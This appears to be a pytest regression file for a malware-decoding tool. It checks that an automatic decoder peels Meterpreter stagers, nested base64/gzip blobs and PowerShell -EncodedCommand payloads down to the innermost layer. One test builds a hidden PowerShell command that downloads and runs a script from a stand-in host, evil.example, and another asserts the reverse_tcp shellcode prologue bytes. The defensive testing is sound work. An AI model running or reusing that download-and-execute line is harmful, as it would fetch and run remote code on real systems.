"""Regression: AUTO INVESTIGATE must reach the SAME terminal state as MAGIC.

The user-reported bug (Feb 2026): `AUTO INVESTIGATE` was using ONLY
`smart_decode` — a greedy single-path chain runner — which stops at the
loader-script layer of the classic Meterpreter/Cobalt-Strike stager, while
`MAGIC` peels 3 more layers down to raw x86 shellcode. Analysts should not
have to manually retry with the "Magic" button.

These tests lock the parity: the deterministic winner picker used by
Auto Investigate must produce the SAME chain / SAME final output as
`magic_decode` for canonical multi-layer payloads.
"""
from __future__ import annotations
import base64
import gzip
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import operations, ops_extended  # noqa: F401 — register op registry
from magic_decoder import magic_decode
from server import _deterministic_best_decode


# --- helpers -------------------------------------------------------------- #

def _fixture(name: str) -> str:
    path = os.path.join(os.path.dirname(__file__), "fixtures", name)
    with open(path) as f:
        return f.read().strip()


def _outer_b64(text: str) -> str:
    m = re.search(r'FromBase64String\("([^"]+)"\)', text)
    assert m, "outer FromBase64String literal missing"
    return m.group(1)


# --- Case 1: real Meterpreter stager (base64 → gzip → b64 → xor → sc) ---- #

def test_meterpreter_stager_auto_investigate_matches_magic():
    """The full 5-op chain must be reached — not the 2-op smart-decode chain."""
    text = _fixture("meterpreter_gzip_xor_stager.txt")

    det = _deterministic_best_decode(text)
    magic_top = (magic_decode(text, max_depth=6, max_branches=5, top_n=3)
                 .get("top_results") or [{}])[0]

    # Auto Investigate reached the SAME final chain as Magic
    det_ops = [s["op"] for s in det["steps"]]
    magic_ops = [c["op"] for c in (magic_top.get("chain") or [])]
    assert det_ops == magic_ops, (
        f"AUTO INVESTIGATE chain diverged from MAGIC:\n"
        f"  auto  = {det_ops}\n"
        f"  magic = {magic_ops}"
    )
    # Reached the shellcode terminal state (this is the whole point)
    assert det["reached_shellcode"] is True, \
        "auto-investigate must reach the raw x86 shellcode, not stop at the loader script"
    # Winning engine is magic (5-op chain) — NOT smart (2-op chain)
    assert det["engine"] == "magic"


def test_meterpreter_stager_recovers_exact_metasploit_prologue():
    """Bytes must match ground-truth reverse_tcp shellcode prologue."""
    text = _fixture("meterpreter_gzip_xor_stager.txt")
    det = _deterministic_best_decode(text)
    out = det["output"]
    # latin-1 roundtrip gives us the raw shellcode bytes
    raw = out.encode("latin-1", errors="replace")
    assert raw[:8] == b"\xfc\xe8\x89\x00\x00\x00\x60\x89", \
        f"unexpected shellcode prologue: {raw[:8].hex()}"
    assert len(raw) == 834


# --- Case 2: synthetic base64(gzip(base64(b'MZ...PE payload'))) ---------- #

def test_nested_b64_gzip_b64_reaches_deepest_layer():
    """A synthetic 3-layer payload must peel all 3 — smart alone stops at 2."""
    inner = b"MZ\x90\x00" + b"\x00" * 60 + b"This program cannot be run in DOS mode.\n" \
            + b"BINARY PE STUB PAYLOAD " * 8
    layer2 = base64.b64encode(inner).decode()
    layer1_bytes = gzip.compress(layer2.encode())
    outer = base64.b64encode(layer1_bytes).decode()

    det = _deterministic_best_decode(outer)
    # Reached "MZ" header inside the payload (all 3 decode ops applied)
    assert "MZ" in det["output"][:6] or "MZ" in det["output"][:200], \
        f"deepest layer NOT reached. output start: {det['output'][:80]!r}"
    # Chain length must be >= 2 (the gzip-decompress op internally accepts
    # base64-encoded input so the pipeline collapses two decode steps into
    # one). What matters is that the DEEPEST layer was reached.
    assert len(det["steps"]) >= 2, \
        f"expected >=2 ops, got {len(det['steps'])}: {[s['op'] for s in det['steps']]}"


# --- Case 3: helper must never regress on simpler payloads --------------- #

def test_single_base64_payload_still_works():
    """Trivial single-layer base64 must not be broken by the new winner logic."""
    payload = base64.b64encode(b"hello world this is a plaintext payload").decode()
    det = _deterministic_best_decode(payload)
    assert "hello world" in det["output"]
    assert len(det["steps"]) >= 1
    # Not shellcode
    assert det["reached_shellcode"] is False


def test_plaintext_input_returns_gracefully():
    """Random plaintext must not crash and must return empty/near-empty steps."""
    det = _deterministic_best_decode("this is just some plain english text with no encoding")
    # Either 0 steps (nothing to decode) or a step whose output is ~= input
    if det["steps"]:
        assert det["output"] or True  # any output OK — just don't crash
    assert det["reached_shellcode"] is False


def test_ps_encoded_command_reaches_final_layer():
    """PowerShell -EncodedCommand payload must be decoded end-to-end."""
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')"
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    payload = f"powershell.exe -NoP -NonI -W Hidden -EncodedCommand {b64}"
    det = _deterministic_best_decode(payload)
    # Must contain the inner IEX/URL — proves we peeled the utf-16-le layer
    assert "IEX" in det["output"] or "New-Object" in det["output"] \
        or "evil.example" in det["output"], \
        f"powershell -EncodedCommand not fully peeled. output={det['output'][:200]!r}"
